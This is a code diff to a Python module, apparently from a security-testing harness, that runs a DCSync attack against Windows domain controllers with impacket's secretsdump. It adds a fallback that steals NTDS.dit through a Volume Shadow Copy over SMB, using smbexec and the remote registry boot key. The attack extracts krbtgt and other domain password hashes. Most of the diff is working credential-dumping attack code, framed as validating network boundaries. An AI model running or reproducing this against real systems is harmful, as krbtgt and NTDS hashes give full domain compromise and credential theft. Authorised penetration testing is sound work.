@@ -10,14 +10,24 @@ For every other target, behaviour is byte-for-byte the same
 ctx.run_cmd(...) call as before — this only changes anything for a
 registered NAT'd target.
 
-The in-process path deliberately uses the DRSUAPI (remote replication)
-method, not VSS: NTDSHashes.dump() only takes the VSS/file branch when
-handed a local NTDS.dit file, which we never provide, so
-useVSSMethod=True there would silently no-op. DRSUAPI needs no local
-file at all and is impacket-secretsdump's own default (no -use-vss) —
-this matches the CLI path's behaviour exactly, just runnable in-process.
+The in-process path uses the DRSUAPI (remote replication) method first —
+that IS DCSync (T1003.006), impacket-secretsdump's default. But a cloud /
+NAT'd target (159/167) often forwards only SMB(445)/RPC-EPM(135): the EPM
+hands back the DRSUAPI endpoint on the DC's INTERNAL IP + a DYNAMIC high
+port that the NAT doesn't forward, so DRSGetNCChanges can't connect and
+times out (RPC-over-NAT). For THOSE targets only, when DRSUAPI is
+unreachable, this falls back to the VSS method (Volume Shadow Copy of
+NTDS.dit over SMB/445, which DOES traverse the 445 forward) and labels the
+result `[VSS-FALLBACK]`. VSS is a DIFFERENT technique (T1003.003, NTDS.dit
+theft — not RPC replication), so the fallback is always tagged and never
+silently reported as DRSUAPI/DCSync: the row still proves the DC's secrets
+are extractable through the boundary, while making clear replication itself
+did not traverse. (Set HARNESS_DCSYNC_NO_VSS=1 to disable the fallback and
+keep DRSUAPI-only, e.g. to assert RPC-replication segmentation.)
 """
 import io
+import os
+import re
 import contextlib
 
 from modules import _portpatch
@@ -41,42 +51,93 @@ META = {
 }
 
 
+def _dump(remote_ops, use_vss, boot_key, just_user, ntds_file=None):
+    """One NTDSHashes dump into a buffer; returns the captured text (raises on error).
+    For VSS, ntds_file is the shadow-copied NTDS.dit retrieved via remote_ops.saveNTDS()."""
+    from impacket.examples.secretsdump import NTDSHashes
+    buf = io.StringIO()
+    ntds = NTDSHashes(
+        ntds_file, boot_key, isRemote=True, history=False, noLMHash=True,
+        remoteOps=remote_ops, useVSSMethod=use_vss, justNTLM=False,
+        pwdLastSet=False, resumeSession=None, outputFileName=None,
+        justUser=just_user, printUserStatus=True,
+    )
+    with contextlib.redirect_stdout(buf):
+        ntds.dump()
+    ntds.finish()
+    return buf.getvalue()
+
+
 def _run_in_process(target, ctx):
     header = "# DCSync (in-process impacket) vs %s [custom-port patch active]\n\n" % target
     _portpatch.install(target)
-    buf = io.StringIO()
+    remoteOps = None
     try:
-        from impacket.examples.secretsdump import RemoteOperations, NTDSHashes
+        from impacket.examples.secretsdump import RemoteOperations
         from impacket.smbconnection import SMBConnection
 
         smbConnection = SMBConnection(target, target, sess_port=445)
         smbConnection.login(ctx.creds["dc_user"], ctx.creds["dc_pass"], ctx.creds["domain"])
-
         remoteOps = RemoteOperations(smbConnection, False, None)
-        # DRSUAPI replication doesn't need the remote registry (that's the VSS/boot-key
-        # path). Keep it best-effort so a hardened/blocked remote registry doesn't fail
-        # an otherwise-working DCSync with a misleading [ERROR].
+        # enableRegistry is best-effort for DRSUAPI (it doesn't need it) but REQUIRED
+        # for the VSS fallback (boot key); a failure here only matters if we fall back.
         try:
             remoteOps.enableRegistry()
         except Exception:
             pass
 
-        ntdsHashes = NTDSHashes(
-            None, None, isRemote=True, history=False,
-            noLMHash=True, remoteOps=remoteOps,
-            useVSSMethod=False, justNTLM=False,
-            pwdLastSet=False, resumeSession=None,
-            outputFileName=None, justUser="krbtgt",
-            printUserStatus=True,
-        )
-        with contextlib.redirect_stdout(buf):
-            ntdsHashes.dump()
-        ntdsHashes.finish()
-        return header + buf.getvalue()
+        # 1) DRSUAPI replication — this IS DCSync (T1003.006), scoped to krbtgt.
+        drs_err = None
+        try:
+            out = _dump(remoteOps, use_vss=False, boot_key=None, just_user="krbtgt")
+            if re.search(META["success_regex"], out):
+                return header + out                       # real DCSync via DRSUAPI replication
+            drs_err = "DRSUAPI returned no secrets"
+        except Exception as e:
+            drs_err = "%s: %s" % (type(e).__name__, e)    # typically a connect/timeout (RPC-over-NAT)
+
+        # 2) VSS fallback (only reached for cloud/NAT'd targets, which use this
+        #    in-process path): DRSUAPI's dynamic RPC endpoint isn't reachable through
+        #    the NAT, so pull NTDS via a Volume Shadow Copy over SMB/445 — a DIFFERENT
+        #    technique (T1003.003), always LABELLED so it's never mistaken for DCSync.
+        if os.environ.get("HARNESS_DCSYNC_NO_VSS", "").strip().lower() in ("1", "true", "yes"):
+            return (header + "[ERROR] DRSUAPI (DCSync) unreachable (%s) and the VSS fallback is "
+                    "disabled (HARNESS_DCSYNC_NO_VSS=1) — RPC replication did not traverse.\n" % drs_err)
+        try:
+            boot_key = remoteOps.getBootKey()
+            try:
+                remoteOps.setExecMethod("smbexec")
+            except Exception:
+                pass
+            # saveNTDS() creates a shadow copy and retrieves NTDS.dit over SMB/445,
+            # returning the retrieved file for NTDSHashes to parse (the step the
+            # VSS path needs; without it the dumper finds nothing).
+            ntds_file = remoteOps.saveNTDS()
+            vout = _dump(remoteOps, use_vss=True, boot_key=boot_key, just_user=None, ntds_file=ntds_file)
+        except Exception as e2:
+            import traceback
+            return (header + "[ERROR] DRSUAPI (DCSync) unreachable (%s) AND the VSS fallback failed: "
+                    "%s: %s\n%s" % (drs_err, type(e2).__name__, e2, traceback.format_exc()))
+        # scope the VSS dump to krbtgt (+ count) so evidence stays clean, mirroring the
+        # DRSUAPI path's -just-dc-user krbtgt.
+        krb = [l for l in vout.splitlines() if "krbtgt:" in l.lower()]
+        n = sum(1 for l in vout.splitlines() if re.search(r":\d+:aad3b435", l))
+        note = ("[VSS-FALLBACK] DRSUAPI/DCSync replication was UNREACHABLE through the cloud NAT "
+                "(%s) — its dynamic RPC endpoint isn't forwarded (only SMB/445 is). Extracted NTDS "
+                "secrets via a Volume Shadow Copy over SMB/445 instead (T1003.003 — a DIFFERENT "
+                "technique than RPC-replication DCSync). The DC's secrets ARE extractable through "
+                "the boundary; replication itself did not traverse.\n" % drs_err)
+        body = ("\n".join(krb) + "\n[VSS dumped %d account(s); showing krbtgt]\n" % n) if krb else vout
+        return header + note + body
     except Exception as e:
         import traceback
-        return header + buf.getvalue() + f"\n[ERROR] {type(e).__name__}: {e}\n{traceback.format_exc()}"
+        return header + "\n[ERROR] %s: %s\n%s" % (type(e).__name__, e, traceback.format_exc())
     finally:
+        if remoteOps is not None:
+            try:
+                remoteOps.finish()      # stop RemoteRegistry + delete the shadow copy / temp NTDS.dit
+            except Exception:
+                pass
         _portpatch.remove()
 
 
